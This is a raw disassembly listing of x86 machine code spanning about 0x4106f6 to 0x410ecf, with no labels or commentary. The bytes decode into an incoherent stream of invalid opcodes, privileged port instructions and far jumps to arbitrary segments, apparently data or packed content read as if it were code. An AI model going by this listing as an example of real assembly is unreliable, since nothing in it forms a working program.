  4106f6:	loopne 0x410720
  4106f8:	dec    ecx
  4106f9:	call   0x7b43:0x316bd83b
  410700:	dec    esi
  410701:	(bad)  
  410702:	push   edi
  410703:	les    esp,FWORD PTR [edx+0x1490c05e]
  410709:	jnp    0x4106a1
  41070b:	shr    DWORD PTR [edx],cl
  41070d:	ds cld 
  41070f:	dec    eax
  410710:	inc    ebx
  410711:	ret    0x8838
  410714:	jmp    0x9ce6:0x8d59b72f
  41071b:	mov    dh,0x58
  41071d:	add    ecx,DWORD PTR [ebp-0x1f]
  410720:	data16 ds std 
  410723:	(bad)  
  410724:	fsubr  DWORD PTR [esi-0xa]
  410727:	gs xchg edi,eax
  410729:	(bad)  
  41072a:	mov    ebx,0x14308286
  41072f:	xchg   edx,eax
  410730:	int    0x5b
  410732:	es loop 0x410791
  410735:	jbe    0x41075f
  410737:	mov    bl,0x11
  410739:	adc    bh,BYTE PTR [edi+0x57]
  41073c:	xor    cl,BYTE PTR [ebx+0x3e]
  41073f:	mov    edi,0x85a72377
  410744:	cmp    al,BYTE PTR [edx-0x70ba877f]
  41074a:	mov    DWORD PTR [ebp+0x346d35d2],ecx
  410750:	popf   
  410751:	dec    edx
  410752:	sbb    BYTE PTR ds:0xb9b83273,dl
  410758:	repz or BYTE PTR [edi+ecx*2+0x6e],dh
  41075d:	clc    
  41075e:	call   0x1f98193a
  410763:	out    0x3d,eax
  410765:	jg     0x41075d
  410767:	pop    edx
  410768:	mov    ebp,0xf9694701
  41076d:	popf   
  41076e:	(bad)  
  41076f:	adc    DWORD PTR [esp+ecx*8-0x10],ebp
  410773:	jp     0x41079c
  410775:	sub    ecx,esi
  410777:	inc    ebx
  410778:	outs   dx,DWORD PTR ds:[esi]
  410779:	sar    DWORD PTR [esi+0x2524acdf],1
  41077f:	xchg   edi,eax
  410780:	stos   DWORD PTR es:[edi],eax
  410781:	inc    edx
  410782:	and    eax,DWORD PTR [ebp+0x7eeffa6f]
  410788:	(bad)  
  410789:	xchg   esi,eax
  41078a:	ret    
  41078b:	test   eax,0x27c0f7fb
  410790:	push   ds
  410791:	rcr    ah,0x69
  410794:	mov    edx,esi
  410796:	in     al,dx
  410797:	inc    edi
  410798:	jne    0x41074a
  41079a:	cmp    ah,BYTE PTR [ecx]
  41079c:	arpl   WORD PTR [ebx+0x71],bx
  41079f:	les    esi,FWORD PTR [edi+0x18e35633]
  4107a5:	out    dx,eax
  4107a6:	aas    
  4107a7:	outs   dx,BYTE PTR ds:[esi]
  4107a8:	push   ss
  4107a9:	int    0xa9
  4107ab:	pop    edx
  4107ac:	jns    0x410826
  4107ae:	daa    
  4107af:	dec    eax
  4107b0:	dec    ebp
  4107b1:	mov    ebp,0xaad695ad
  4107b6:	or     DWORD PTR [ecx-0x23c403dd],0x3b
  4107bd:	pop    ecx
  4107be:	pop    edx
  4107bf:	mov    edx,0x206bbbd8
  4107c4:	jle    0x41074d
  4107c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107c7:	inc    esi
  4107c8:	add    ah,BYTE PTR [ebx]
  4107ca:	lds    esp,FWORD PTR [edi-0x6e]
  4107cd:	pop    edi
  4107ce:	push   ss
  4107cf:	lea    edx,[eax+ebx*1]
  4107d2:	(bad)  
  4107d3:	sbb    ch,bh
  4107d5:	loop   0x4107b7
  4107d7:	cld    
  4107d8:	in     eax,0xb0
  4107da:	inc    ecx
  4107db:	xchg   edi,eax
  4107dc:	mov    bl,0xcc
  4107de:	pop    es
  4107df:	bswap  edi
  4107e1:	inc    ebx
  4107e2:	mov    DWORD PTR [edx+0x277e9728],0x38c59726
  4107ec:	sbb    DWORD PTR [ebx-0x5e845e5d],ecx
  4107f2:	adc    ecx,esp
  4107f4:	lds    ecx,FWORD PTR [ecx]
  4107f6:	ds mov edi,0x193a111b
  4107fc:	syscall 
  4107fe:	cmp    BYTE PTR [esi+ebp*1-0x7c175eb],cl
  410805:	shl    BYTE PTR [esi+0xb],1
  410808:	jge    0x41081a
  41080a:	cwde   
  41080b:	pop    edx
  41080c:	xlat   BYTE PTR ds:[ebx]
  41080d:	(bad)  
  41080e:	adc    DWORD PTR [edx-0x6f],edi
  410811:	test   ch,0x7
  410814:	mov    ?,WORD PTR [edi+0x19ecc913]
  41081a:	mov    dl,0xd5
  41081c:	inc    esi
  41081d:	mov    dh,0x52
  41081f:	sub    dh,BYTE PTR [edx+0x2b303f16]
  410825:	dec    esp
  410826:	cmp    dl,bl
  410828:	mov    ebp,0xd0ab0381
  41082d:	imul   eax,DWORD PTR [edi+0x6b],0xffffffd3
  410831:	lods   al,BYTE PTR ds:[esi]
  410832:	jg     0x410839
  410834:	xor    DWORD PTR [ebx+0x1259ff24],0x6d99cb8b
  41083e:	xor    ecx,DWORD PTR [ecx-0x44]
  410841:	out    0xda,eax
  410843:	or     al,0x88
  410845:	mov    ecx,0x2423c658
  41084a:	data16 xor dl,BYTE PTR [ebp+0x2cb13208]
  410851:	mov    edx,0x7da2e7b0
  410856:	push   ss
  410857:	mov    ecx,0xe0a43c2c
  41085c:	cmc    
  41085d:	ret    
  41085e:	jo     0x4107eb
  410860:	ficomp DWORD PTR [edi-0x5b41f48f]
  410866:	sub    eax,0x9120f752
  41086b:	fcomi  st,st(6)
  41086d:	inc    ecx
  41086e:	inc    ebp
  41086f:	icebp  
  410870:	shl    DWORD PTR [esi+0x43],cl
  410873:	xor    eax,0x4118f9b1
  410878:	adc    eax,0x4028c746
  41087d:	les    esp,FWORD PTR [esi]
  41087f:	mov    edx,0xa63d4d59
  410884:	and    ebx,ebx
  410886:	jb     0x4108a3
  410888:	mov    ds:0x910f0e2c,al
  41088d:	lods   eax,DWORD PTR ds:[esi]
  41088e:	or     BYTE PTR [eax-0x13],ah
  410891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410892:	mov    cl,0x3c
  410894:	leave  
  410895:	pop    esp
  410896:	mov    esp,0x69387b7b
  41089b:	push   ds
  41089c:	imul   edx,DWORD PTR [esi],0xcc27c68
  4108a2:	jne    0x4108a4
  4108a4:	repnz ss (bad) 
  4108a7:	sub    ebx,edi
  4108a9:	int3   
  4108aa:	leave  
  4108ab:	push   ebp
  4108ac:	jmp    0x41091e
  4108ae:	mov    ebp,0x7efb37ae
  4108b3:	dec    edi
  4108b4:	cwde   
  4108b5:	(bad)  
  4108b7:	pop    esp
  4108b8:	stos   DWORD PTR es:[edi],eax
  4108b9:	(bad)  
  4108ba:	(bad)  
  4108bb:	sar    dl,cl
  4108bd:	(bad)  
  4108be:	cs jo  0x41088e
  4108c1:	sti    
  4108c2:	mov    gs,WORD PTR [edx+0x7b6dd3c8]
  4108c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108c9:	cdq    
  4108ca:	ds inc ecx
  4108cc:	jl     0x410942
  4108ce:	jp     0x410891
  4108d0:	mov    edi,0x1b53c93
  4108d5:	aaa    
  4108d6:	add    edi,ebx
  4108d8:	out    dx,al
  4108d9:	loope  0x4108f5
  4108db:	jb     0x4108f0
  4108dd:	mov    ch,0x24
  4108df:	in     eax,dx
  4108e0:	mov    DWORD PTR [edx+ebx*1+0x7],esi
  4108e4:	lea    esp,[ecx+0x4d]
  4108e7:	outs   dx,BYTE PTR ds:[esi]
  4108e8:	dec    esi
  4108e9:	loope  0x41090c
  4108eb:	inc    eax
  4108ec:	jecxz  0x410913
  4108ee:	add    ch,BYTE PTR [esi+0x32]
  4108f1:	xchg   esi,eax
  4108f2:	jne    0x4108cd
  4108f4:	inc    edi
  4108f5:	pop    esi
  4108f6:	aaa    
  4108f7:	mov    ah,0xbc
  4108f9:	inc    edi
  4108fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108fc:	les    esp,FWORD PTR [edi]
  4108fe:	sbb    BYTE PTR [esi],0xf0
  410901:	pop    ds
  410902:	fistp  QWORD PTR [ebx]
  410904:	call   0x6902:0xd0d3567b
  41090b:	repnz cmc 
  41090d:	adc    cl,BYTE PTR [esi-0x62]
  410910:	mov    esi,0xf402e712
  410915:	sub    dh,BYTE PTR [ecx]
  410917:	xor    eax,0x90851dc6
  41091c:	jb     0x41094a
  41091e:	icebp  
  41091f:	adc    edi,0xf356685d
  410925:	mov    eax,ds:0x7f425904
  41092a:	add    BYTE PTR [ebp+ebp*1-0x5319aa0d],dh
  410931:	sti    
  410932:	and    DWORD PTR [edx-0x2c8aa7bc],esi
  410938:	iret   
  410939:	or     DWORD PTR ds:0x9a27abf0,edx
  41093f:	add    BYTE PTR [edi-0x6b],ah
  410942:	jl     0x41094a
  410944:	cmp    al,0x25
  410946:	cmp    eax,0x9740cd26
  41094b:	jmp    0x39ad7bad
  410950:	mov    DWORD PTR [edi+0x3f],esi
  410953:	test   DWORD PTR [ecx+0x68],edx
  410956:	pop    ecx
  410957:	test   DWORD PTR [edx],ebx
  410959:	(bad)  
  41095a:	pop    edx
  41095b:	adc    DWORD PTR [edx],eax
  41095d:	push   es
  41095e:	sbb    al,dh
  410960:	adc    eax,DWORD PTR [esi]
  410962:	mov    bh,0x6b
  410964:	mov    ch,0xb1
  410966:	div    DWORD PTR [eax*2-0x5996d147]
  41096d:	add    BYTE PTR [ebx-0x30],dh
  410970:	(bad)  
  410971:	rcl    BYTE PTR [ebx+edx*2-0x465ac26e],cl
  410978:	inc    ecx
  410979:	(bad)  
  41097a:	(bad)  
  41097b:	sbb    bl,dl
  41097d:	jno    0x410953
  41097f:	inc    ecx
  410980:	out    0x5e,eax
  410982:	or     BYTE PTR [esi-0x281d2e6b],dl
  410988:	shr    ebp,0xc3
  41098b:	inc    ecx
  41098c:	rcl    DWORD PTR [esi],0xca
  41098f:	and    cl,bh
  410991:	call   0xd255c94b
  410996:	mov    ds,WORD PTR [esi-0x3929c15f]
  41099c:	ret    0xb246
  41099f:	or     ebx,DWORD PTR [ecx]
  4109a1:	and    edi,ecx
  4109a3:	adc    esp,edx
  4109a5:	xor    DWORD PTR [ecx-0x65],ebx
  4109a8:	cs repnz cmp eax,0xfa74fc42
  4109af:	pop    es
  4109b0:	add    al,0x29
  4109b2:	mov    ?,edx
  4109b4:	call   0x72dc6c7
  4109b9:	jns    0x41098b
  4109bb:	idiv   DWORD PTR [ebx]
  4109bd:	mov    al,0x5c
  4109bf:	(bad)  
  4109c0:	es test eax,0x6ce2e3b
  4109c6:	sub    edx,DWORD PTR [edi]
  4109c8:	repnz in al,0x92
  4109cb:	in     al,0x4b
  4109cd:	cs push esi
  4109cf:	inc    ebx
  4109d0:	pop    edx
  4109d1:	mov    eax,ds:0x6cdbb17a
  4109d6:	(bad)  
  4109d7:	out    dx,eax
  4109d8:	xchg   BYTE PTR [edx],dh
  4109da:	imul   esp,DWORD PTR [ecx+0x7c],0x6f
  4109de:	dec    ebp
  4109df:	mov    WORD PTR [ecx],ds
  4109e1:	xchg   edx,eax
  4109e2:	and    DWORD PTR [esi+0x2c],esp
  4109e5:	sti    
  4109e6:	xor    al,0x45
  4109e8:	jns    0x3b2d4582
  4109ee:	retf   
  4109ef:	add    al,0xc8
  4109f1:	fdivr  QWORD PTR [esi-0x1e69cfc9]
  4109f7:	adc    DWORD PTR [eax+0x36],ebx
  4109fa:	add    ebp,DWORD PTR [esi]
  4109fc:	retf   
  4109fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109fe:	xchg   ecx,eax
  4109ff:	in     al,0xd0
  410a01:	inc    ecx
  410a02:	sbb    BYTE PTR ds:0x8cf6c977,dh
  410a08:	mov    edi,0x6c69b55c
  410a0d:	dec    ebx
  410a0e:	jns    0x4109b4
  410a10:	or     eax,0x8ce121af
  410a15:	pop    ss
  410a16:	(bad)  
  410a17:	cmp    dl,BYTE PTR [ecx-0x56]
  410a1a:	sbb    ebx,DWORD PTR [ecx+0x5e]
  410a1d:	mov    ebx,0xed143d47
  410a22:	xchg   BYTE PTR ds:0xea757dd8,cl
  410a28:	pop    edi
  410a29:	inc    ecx
  410a2a:	inc    cl
  410a2c:	or     al,0xf4
  410a2e:	pushf  
  410a2f:	frstor [edx-0x2c28684c]
  410a35:	inc    esi
  410a36:	fstp   DWORD PTR [esi-0x73]
  410a39:	sbb    eax,DWORD PTR [eax+0x14]
  410a3c:	cld    
  410a3d:	nop
  410a3e:	add    DWORD PTR [ecx],0x405acabe
  410a44:	lahf   
  410a45:	rcl    BYTE PTR [esi],cl
  410a47:	sbb    DWORD PTR [edi-0x7c],edx
  410a4a:	ret    0x3013
  410a4d:	ss int 0x93
  410a50:	bsf    ebx,DWORD PTR [ebx-0x1e]
  410a54:	xchg   edx,eax
  410a55:	add    eax,DWORD PTR [edx+edx*2]
  410a58:	les    eax,FWORD PTR [esi+eax*1+0x1a]
  410a5c:	daa    
  410a5d:	push   ebx
  410a5e:	pop    ebp
  410a5f:	push   cs
  410a60:	(bad)  
  410a61:	add    DWORD PTR [ebp+0x6ca6963c],ecx
  410a67:	mov    eax,0x190f1b18
  410a6c:	mov    edi,0x8d5a71be
  410a71:	push   edx
  410a72:	sub    ebx,DWORD PTR [ebx]
  410a74:	addr16 cmp al,0x15
  410a77:	(bad)  
  410a78:	iret   
  410a79:	mov    ebx,0x837251dc
  410a7e:	bound  ebx,QWORD PTR [ebx+ebx*2]
  410a81:	jp     0x410a58
  410a83:	rcr    BYTE PTR [ecx+esi*2+0x1304f951],cl
  410a8a:	cmp    DWORD PTR [eax],ebp
  410a8c:	cli    
  410a8d:	in     eax,0xc8
  410a8f:	or     cl,BYTE PTR [ecx+0x4a]
  410a92:	mov    dh,0x8b
  410a94:	cli    
  410a95:	cmp    eax,0xf22b8060
  410a9a:	stos   DWORD PTR es:[edi],eax
  410a9b:	add    BYTE PTR [ebx-0x22],dh
  410a9e:	pop    esp
  410a9f:	mov    ds:0x550d9a41,al
  410aa4:	ror    ecx,0xb8
  410aa7:	ins    DWORD PTR es:[edi],dx
  410aa8:	pop    edi
  410aa9:	adc    eax,0x2367b645
  410aae:	mov    dl,0x1f
  410ab0:	imul   edx,ebp,0xffffffb3
  410ab3:	add    ch,BYTE PTR [ebx+0x74049ed5]
  410ab9:	pop    es
  410aba:	inc    esi
  410abb:	sbb    al,0x7c
  410abd:	mov    ecx,0xba1b5e00
  410ac2:	dec    ebx
  410ac3:	scas   eax,DWORD PTR es:[edi]
  410ac4:	test   al,0x22
  410ac6:	jno    0x410ae5
  410ac8:	pop    edi
  410ac9:	call   0x74285d6a
  410ace:	fistp  DWORD PTR [edx]
  410ad0:	ret    0xb6ec
  410ad3:	rcl    al,0xca
  410ad6:	or     al,0xf7
  410ad8:	or     al,0x2e
  410ada:	fsub   DWORD PTR [ecx+0x5229d3a3]
  410ae0:	into   
  410ae1:	add    bh,BYTE PTR [esi+0x54]
  410ae4:	shl    BYTE PTR [ebx+0x3a],0xf5
  410ae8:	cmp    BYTE PTR [ecx+0x7742ee63],al
  410aee:	inc    ebx
  410aef:	scas   eax,DWORD PTR es:[edi]
  410af0:	ret    
  410af1:	hlt    
  410af2:	inc    edx
  410af3:	fnstsw WORD PTR [esi-0x1]
  410af6:	add    eax,0x57333de1
  410afb:	nop    DWORD PTR [esi+ebx*2]
  410aff:	inc    esp
  410b00:	push   ecx
  410b01:	ret    0xc68
  410b04:	scas   al,BYTE PTR es:[edi]
  410b05:	add    al,0x12
  410b07:	inc    edx
  410b08:	mov    cl,0x82
  410b0a:	jns    0x410b38
  410b0c:	(bad)  
  410b0d:	xor    DWORD PTR [eax-0x12],eax
  410b10:	rcr    dh,cl
  410b12:	aam    0x53
  410b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b15:	cmp    esp,DWORD PTR [ebp+ebp*8+0x6e5402eb]
  410b1c:	leave  
  410b1d:	adc    esi,DWORD PTR [eax]
  410b1f:	in     eax,0x55
  410b21:	popf   
  410b22:	je     0x410b89
  410b24:	fistp  DWORD PTR [ecx]
  410b26:	xor    ah,al
  410b28:	xor    eax,0xf9773ad2
  410b2d:	dec    DWORD PTR [edi]
  410b2f:	push   ds
  410b30:	sub    eax,DWORD PTR [esi-0x4e]
  410b33:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  410b35:	sbb    ah,BYTE PTR [edx+0x5262e720]
  410b3b:	mov    bl,0xc6
  410b3d:	push   es
  410b3e:	adc    eax,0xcc383668
  410b43:	mov    ch,0x26
  410b45:	sar    dh,cl
  410b47:	xchg   ebp,eax
  410b48:	fistp  QWORD PTR [edi-0x2b]
  410b4b:	and    dl,ch
  410b4d:	int3   
  410b4e:	scas   eax,DWORD PTR es:[edi]
  410b4f:	and    al,0x3b
  410b51:	and    esp,eax
  410b53:	mov    DWORD PTR [ecx-0x24],esi
  410b56:	xchg   edi,eax
  410b57:	cdq    
  410b58:	pusha  
  410b59:	mov    ds:0xb61d110a,al
  410b5e:	cmp    al,dh
  410b60:	repz xor edx,esp
  410b63:	lds    esp,FWORD PTR [ecx]
  410b65:	or     dl,BYTE PTR [ebx-0x29100a40]
  410b6b:	rcl    BYTE PTR [edx],0xe9
  410b6e:	or     dh,ah
  410b70:	cmp    al,0x52
  410b72:	aaa    
  410b73:	inc    ecx
  410b74:	out    0x6b,al
  410b76:	xor    DWORD PTR [edx-0x7177ee98],0x547d5278
  410b80:	imul   DWORD PTR cs:[esi+edi*2+0x49]
  410b85:	xor    ebp,edi
  410b87:	sub    ebx,DWORD PTR [ebx]
  410b89:	push   ebx
  410b8a:	push   ecx
  410b8b:	jo     0x410b18
  410b8d:	aaa    
  410b8e:	sub    eax,DWORD PTR [edx+0x2f]
  410b91:	push   ds
  410b92:	jno    0x410beb
  410b94:	lahf   
  410b95:	jo     0x410b60
  410b97:	adc    eax,DWORD PTR [edi]
  410b99:	pushf  
  410b9a:	mov    ds:0xfa59e88e,eax
  410b9f:	cmp    al,ch
  410ba1:	or     DWORD PTR [ecx+0x57f48151],esi
  410ba7:	out    0x70,al
  410ba9:	pop    es
  410baa:	lods   al,BYTE PTR ds:[esi]
  410bab:	cwde   
  410bac:	xor    eax,0xf72747f6
  410bb1:	int    0xf8
  410bb3:	mov    ah,0x84
  410bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bb6:	aaa    
  410bb7:	repz daa 
  410bb9:	lea    esi,ds:0xe91d80f1
  410bbf:	mov    bl,0x6
  410bc1:	or     DWORD PTR [esi-0x1f],ebp
  410bc4:	popf   
  410bc5:	aam    0xf9
  410bc7:	mov    eax,0x3ae1f313
  410bcc:	jno    0x410bcd
  410bce:	adc    DWORD PTR ds:0xc2c6a1b3,0x7c485fd6
  410bd8:	inc    ecx
  410bd9:	(bad)  [eax]
  410bdb:	cld    
  410bdc:	xor    ch,0x4a
  410bdf:	dec    edi
  410be0:	imul   BYTE PTR [ecx-0x1837bc9f]
  410be6:	repnz mov bl,0xb4
  410be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bea:	and    esp,DWORD PTR ds:0x9275027d
  410bf0:	mov    ebp,DWORD PTR fs:[edx+0x1324e712]
  410bf7:	mov    eax,ds:0xc58e097c
  410bfc:	push   ebp
  410bfd:	sti    
  410bfe:	push   ds
  410bff:	mov    ebp,0x4f835d05
  410c04:	push   ss
  410c05:	lahf   
  410c06:	jmp    0x91dc:0x162de0da
  410c0d:	je     0x410bed
  410c0f:	or     al,0xa0
  410c12:	or     al,0xa5
  410c14:	jo     0x410b99
  410c16:	stc    
  410c17:	sub    eax,0xbe60b0c8
  410c1c:	dec    esp
  410c1d:	adc    DWORD PTR [esi+0x63],0x31c23806
  410c24:	rcr    DWORD PTR [edx],1
  410c26:	(bad)  
  410c27:	lock das 
  410c29:	push   es
  410c2a:	add    DWORD PTR [ecx+0x1c096548],ebp
  410c30:	fwait
  410c31:	mov    eax,0x3762cbe0
  410c36:	jmp    0xef95:0xe0212bd0
  410c3d:	inc    edi
  410c3e:	sub    edi,DWORD PTR [ecx-0x75376388]
  410c44:	adc    ah,BYTE PTR ds:0x810d12b4
  410c4a:	fbld   TBYTE PTR [ebx+0x41]
  410c4d:	int    0x5b
  410c4f:	into   
  410c50:	push   0x524473eb
  410c55:	icebp  
  410c56:	cmp    ebx,DWORD PTR [edi-0x6b]
  410c59:	sbb    ch,BYTE PTR [edi]
  410c5b:	dec    edi
  410c5c:	outs   dx,DWORD PTR ds:[esi]
  410c5d:	or     cl,al
  410c5f:	push   0x3f
  410c61:	push   ecx
  410c62:	retf   0x6d09
  410c65:	mov    bh,0xff
  410c67:	pop    esp
  410c68:	inc    esi
  410c69:	or     DWORD PTR ds:0xe3b1e90a,ebx
  410c6f:	fdivr  QWORD PTR [edx]
  410c71:	and    eax,0x9d86e9ee
  410c76:	adc    ebp,DWORD PTR [edi-0x4]
  410c79:	and    BYTE PTR [edx-0x69df3174],dh
  410c7f:	jecxz  0x410c95
  410c81:	xor    ah,BYTE PTR [esi+edx*8]
  410c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c85:	xchg   esp,eax
  410c86:	stc    
  410c87:	jae    0x410c34
  410c89:	dec    DWORD PTR [ecx]
  410c8b:	cmp    eax,edi
  410c8d:	mov    BYTE PTR [ebp-0x11],ch
  410c90:	arpl   WORD PTR [esi+ebp*1-0x52],bx
  410c94:	or     al,BYTE PTR cs:[ecx+ecx*4]
  410c98:	in     al,dx
  410c99:	mov    al,BYTE PTR [esi]
  410c9b:	mov    bh,BYTE PTR [ecx+ebp*4-0x7]
  410c9f:	cmp    al,0x26
  410ca1:	pop    esi
  410ca2:	jmp    ebp
  410ca4:	jg     0x410ca3
  410ca6:	or     DWORD PTR [edx],0xffffffad
  410ca9:	ds add eax,0xe8703952
  410caf:	test   eax,0x7cecc7c0
  410cb4:	icebp  
  410cb5:	shl    BYTE PTR [esi],0xef
  410cb8:	hlt    
  410cb9:	push   edx
  410cba:	fwait
  410cbb:	mov    ecx,0xa4f71275
  410cc0:	les    ebx,FWORD PTR ds:0xc0be8a0a
  410cc6:	into   
  410cc7:	push   es
  410cc8:	pop    ebp
  410cc9:	mov    eax,DWORD PTR [eax+0x43de918b]
  410ccf:	in     al,dx
  410cd0:	inc    esi
  410cd1:	push   cs
  410cd2:	hlt    
  410cd3:	cdq    
  410cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd5:	test   eax,0xe250b2c6
  410cdb:	sahf   
  410cdc:	pop    esi
  410cdd:	call   0x929ad998
  410ce2:	test   DWORD PTR [esi-0x7282b9c9],esp
  410ce8:	xchg   esi,edi
  410cea:	rol    BYTE PTR [edi],cl
  410cec:	sar    BYTE PTR [ecx],1
  410cee:	(bad)  
  410cef:	adc    DWORD PTR [edi-0x77],ebx
  410cf2:	adc    eax,0x5f00ea05
  410cf7:	cmp    ecx,ebp
  410cf9:	fs dec esi
  410cfb:	lods   eax,DWORD PTR ds:[esi]
  410cfc:	retf   0x6bb6
  410cff:	jnp    0x410d78
  410d01:	or     dl,BYTE PTR [edi]
  410d03:	(bad)  
  410d04:	jp     0x410d59
  410d06:	stc    
  410d07:	(bad)  
  410d08:	push   0xab1b0ad7
  410d0d:	ja     0x410d1b
  410d0f:	cmp    DWORD PTR [ebx],ebx
  410d11:	or     al,0xf7
  410d13:	fsubr  DWORD PTR [eax+ecx*4]
  410d16:	in     al,0xda
  410d18:	sar    DWORD PTR [edi*8+0x7d6ed0b8],0xf2
  410d20:	xlat   BYTE PTR ds:[ebx]
  410d21:	push   esi
  410d22:	mov    dh,0xae
  410d24:	rcl    DWORD PTR [ebx*8-0x539e6281],1
  410d2b:	stc    
  410d2c:	mov    ecx,0xcff49f71
  410d31:	leave  
  410d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d33:	jle    0x410d23
  410d35:	inc    ecx
  410d36:	jmp    0x61506e2a
  410d3b:	inc    ebx
  410d3c:	sbb    DWORD PTR [eax],esp
  410d3e:	cmp    DWORD PTR [eax],esi
  410d40:	and    al,0xa3
  410d42:	(bad)  
  410d43:	sbb    al,0xc
  410d45:	mov    cs,esp
  410d47:	cmp    DWORD PTR [esi],0x7bdc319a
  410d4d:	jbe    0x410dc1
  410d4f:	cmp    esp,DWORD PTR [edi-0x80]
  410d52:	and    ch,BYTE PTR [ebp+0x6602e07f]
  410d58:	adc    DWORD PTR [edx-0x40],edx
  410d5b:	je     0x410cec
  410d5d:	std    
  410d5e:	jmp    0x410cfd
  410d60:	in     al,0xf0
  410d62:	sub    esi,DWORD PTR [ebx]
  410d64:	shl    DWORD PTR [ecx+0x79],1
  410d67:	push   esp
  410d68:	jnp    0x410d3e
  410d6a:	mov    eax,ds:0xe1e4572b
  410d6f:	jecxz  0x410dba
  410d71:	pop    ss
  410d72:	add    BYTE PTR [eax+0x198a29cd],0x7c
  410d79:	push   edx
  410d7a:	inc    edx
  410d7b:	lds    eax,FWORD PTR [edi+0x4088cfac]
  410d81:	ins    DWORD PTR es:[edi],dx
  410d82:	or     al,0xd8
  410d84:	inc    esp
  410d85:	fisub  DWORD PTR [edi-0x5c78251c]
  410d8b:	push   esp
  410d8c:	repnz out 0x68,al
  410d8f:	in     al,0x1b
  410d91:	and    bh,BYTE PTR [eax+0x1f806ae5]
  410d97:	xor    edi,0x202313ee
  410d9d:	call   0xc69f:0x76725f83
  410da4:	xor    eax,DWORD PTR [eax]
  410da6:	mov    ebp,0xca706996
  410dab:	rcr    DWORD PTR [esi],0xd3
  410dae:	adc    BYTE PTR [esi-0x777eb0a5],bh
  410db4:	dec    edi
  410db5:	mov    edx,0xcb0ddb39
  410dba:	shl    DWORD PTR ds:0x7883cfa6,1
  410dc0:	lds    esi,FWORD PTR [edi+0x20]
  410dc3:	out    0xba,al
  410dc5:	cs sbb edx,edx
  410dc8:	sar    DWORD PTR [esi],0xee
  410dcb:	mov    ah,0xba
  410dcd:	and    edx,DWORD PTR [edx-0x70]
  410dd0:	loop   0x410db4
  410dd2:	je     0x410dd2
  410dd4:	pusha  
  410dd5:	and    bh,BYTE PTR [esi-0x68]
  410dd8:	icebp  
  410dd9:	inc    ebx
  410dda:	sbb    eax,0xebcded09
  410ddf:	pop    ds
  410de0:	pop    ss
  410de1:	js     0x410d83
  410de3:	adc    edx,edi
  410de5:	jp     0x410db0
  410de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410de8:	aas    
  410de9:	nop
  410dea:	and    al,0xb9
  410dec:	call   FWORD PTR [esi-0x3d721560]
  410df2:	frstor [eax]
  410df4:	dec    edi
  410df5:	mov    al,0xa5
  410df7:	jmp    0x410e43
  410df9:	(bad)  
  410dfa:	and    al,0x29
  410dfc:	add    DWORD PTR [ebx],0xffffffbd
  410dff:	sti    
  410e00:	cmp    BYTE PTR [ecx*4-0x78294f8c],cl
  410e07:	jmp    0x44b:0xef401574
  410e0e:	jmp    0xff96:0x577992db
  410e15:	pop    es
  410e16:	hlt    
  410e17:	aas    
  410e18:	cli    
  410e19:	jge    0x410e49
  410e1b:	call   0xb5f3:0x2cd25de4
  410e22:	jns    0x410e38
  410e24:	and    al,ah
  410e26:	sahf   
  410e27:	add    al,0x19
  410e29:	mov    edx,0xc69d4511
  410e2e:	ss in  al,0x3b
  410e31:	mov    ah,0x2
  410e33:	fsubrp st(2),st
  410e35:	(bad)  
  410e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e37:	out    dx,al
  410e38:	inc    ebx
  410e39:	loop   0x410e9f
  410e3b:	sub    DWORD PTR [ecx-0x1a872420],edx
  410e41:	(bad)  
  410e42:	mov    esp,0xbdcacdf6
  410e47:	je     0x410e5d
  410e49:	mov    ebx,0x6442f12f
  410e4e:	sbb    al,0x76
  410e50:	test   DWORD PTR fs:[ebx],ecx
  410e53:	inc    dx
  410e55:	(bad)  
  410e56:	cdq    
  410e57:	(bad)  
  410e59:	popa   
  410e5a:	push   edx
  410e5b:	in     al,0x8e
  410e5d:	ror    BYTE PTR [esi],0xdc
  410e60:	fyl2x  
  410e62:	rol    DWORD PTR [ebx-0x5f],1
  410e65:	or     BYTE PTR [esi-0x24b3c16e],cl
  410e6b:	xor    BYTE PTR [ecx-0x43],dl
  410e6e:	aam    0x39
  410e70:	push   esi
  410e71:	imul   edx,DWORD PTR [ecx+ebx*8+0xa5d37f2],0x5b
  410e79:	xchg   ebx,eax
  410e7a:	clc    
  410e7b:	retf   
  410e7c:	push   ebx
  410e7d:	xchg   edx,eax
  410e7e:	pop    ds
  410e7f:	xor    eax,0x93eac680
  410e84:	stos   DWORD PTR es:[edi],eax
  410e85:	mov    ?,WORD PTR [ecx+0x2c4856d6]
  410e8b:	stos   BYTE PTR es:[edi],al
  410e8c:	push   eax
  410e8d:	cld    
  410e8e:	push   0xffffff9f
  410e90:	sbb    ecx,DWORD PTR [eax]
  410e92:	ror    BYTE PTR [ebx],cl
  410e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e95:	mov    dh,0x22
  410e97:	adc    dh,BYTE PTR [ebx-0x77]
  410e9a:	ins    BYTE PTR es:[edi],dx
  410e9b:	cmp    eax,0x5607ec5e
  410ea0:	loope  0x410e81
  410ea2:	adc    al,0xb2
  410ea4:	fs loopne 0x410e77
  410ea7:	pshufw mm5,QWORD PTR ds:0x9f02135f,0x1e
  410eaf:	pusha  
  410eb0:	mov    bl,0xf0
  410eb2:	and    eax,0xff92b6a2
  410eb7:	push   ss
  410eb8:	not    bl
  410eba:	popa   
  410ebb:	xor    ecx,esp
  410ebd:	call   0x5c11:0x15a71355
  410ec4:	mov    al,es:0xd994958b
  410eca:	lds    esp,FWORD PTR [ecx]
  410ecc:	mov    ch,0x5a
  410ece:	das    
  410ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
